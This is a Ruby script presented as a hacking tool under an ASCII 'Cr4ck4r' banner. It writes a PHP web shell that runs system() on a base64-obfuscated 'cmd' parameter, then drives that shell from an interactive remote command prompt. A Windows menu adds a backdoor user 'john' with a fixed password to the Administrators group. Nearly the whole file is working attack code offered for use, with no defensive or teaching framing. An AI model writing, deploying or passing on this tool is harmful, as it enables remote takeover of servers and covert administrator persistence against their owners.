#/usr/bin/ruby -w
require "open-uri"
require "colorize"

$name = ARGV[0]
$uri = ARGV[1]


if ($name == nil) and ($uri == nil ) then 
puts "
                                                                                                                                     
                                                                                                                                     
        CCCCCCCCCCCCC                           444444444                      kkkkkkkk               444444444                      
     CCC::::::::::::C                          4::::::::4                      k::::::k              4::::::::4                      
   CC:::::::::::::::C                         4:::::::::4                      k::::::k             4:::::::::4                      
  C:::::CCCCCCCC::::C                        4::::44::::4                      k::::::k            4::::44::::4                      
 C:::::C       CCCCCCrrrrr   rrrrrrrrr      4::::4 4::::4      cccccccccccccccc k:::::k    kkkkkkk4::::4 4::::4  rrrrr   rrrrrrrrr   
C:::::C              r::::rrr:::::::::r    4::::4  4::::4    cc:::::::::::::::c k:::::k   k:::::k4::::4  4::::4  r::::rrr:::::::::r  
C:::::C              r:::::::::::::::::r  4::::4   4::::4   c:::::::::::::::::c k:::::k  k:::::k4::::4   4::::4  r:::::::::::::::::r 
C:::::C              rr::::::rrrrr::::::r4::::444444::::444c:::::::cccccc:::::c k:::::k k:::::k4::::444444::::444rr::::::rrrrr::::::r
C:::::C               r:::::r     r:::::r4::::::::::::::::4c::::::c     ccccccc k::::::k:::::k 4::::::::::::::::4 r:::::r     r:::::r
C:::::C               r:::::r     rrrrrrr4444444444:::::444c:::::c              k:::::::::::k  4444444444:::::444 r:::::r     rrrrrrr
C:::::C               r:::::r                      4::::4  c:::::c              k:::::::::::k            4::::4   r:::::r            
 C:::::C       CCCCCC r:::::r                      4::::4  c::::::c     ccccccc k::::::k:::::k           4::::4   r:::::r            
  C:::::CCCCCCCC::::C r:::::r                      4::::4  c:::::::cccccc:::::ck::::::k k:::::k          4::::4   r:::::r            
   CC:::::::::::::::C r:::::r                    44::::::44 c:::::::::::::::::ck::::::k  k:::::k       44::::::44 r:::::r            
     CCC::::::::::::C r:::::r                    4::::::::4  cc:::::::::::::::ck::::::k   k:::::k      4::::::::4 r:::::r            
        CCCCCCCCCCCCC rrrrrrr                    4444444444    cccccccccccccccckkkkkkkk    kkkkkkk     4444444444 rrrrrrr            
                                                                                                                                     
                                                                                                                                     
                                                                                                                                     
                                                                                                                                     
                                                                                                                                     
                                                                                                                                     
                                                                                                                                     
      
                     USAGE :  ra.rb start <site>/shell.php
                              ra.rb shell.php
                               <whelp>
      ".red
        

	end

if ($name != nil ) and ($uri == nil ) then

	$shell = """ <?php echo system($_GET[base64_decode('Y21k')]);?>"""
   $f = File.new("#{$name}","w")
   $f.write($shell)
   $f.close

   puts "The File #{$name} Has been created succesufuly ! ".green

end

if ($name == "start") and ($uri != nil ) then
$inf = open("http://#{$uri}?cmd=ver").read
$inf2 = open("http://#{$uri}?cmd=uname -a ").read
puts "#{$inf}#{$inf2}".green  
while true do 



print "<@root> ".red
ARGV.clear
$command = gets.chomp

if $command == "whelp" then 
       puts " [0] Creat User "
       puts " [1] Add User to ADMIN_GROUP"
       puts " [2] Show users "
      

      if $inf["Microsoft Windows"].nil? then 
       
  else
      	while true do 
       
       puts  "------------------------------------ "
       print "@WINDOWS :: ".green
       $option = gets.chomp
       puts  "------------------------------------ "
     
       if $option == "0" then 
       puts open("http://#{$uri}?cmd=net user john 14243454 /add ").read
       puts "User Jhon Has benn created with 14243454 password ! ".green
                         
end
      if $option == "1" then 
        puts open("http://#{$uri}?cmd=net localgroup Administrators john /add ").read
        puts "user John added to group ".green
end
   if $option == "2" then 
    puts open("http://#{$uri}?cmd=net users ").read
   end
end

end
end


$html = open("http://#{$uri}?cmd=#{$command}").read

puts $html
end

	end
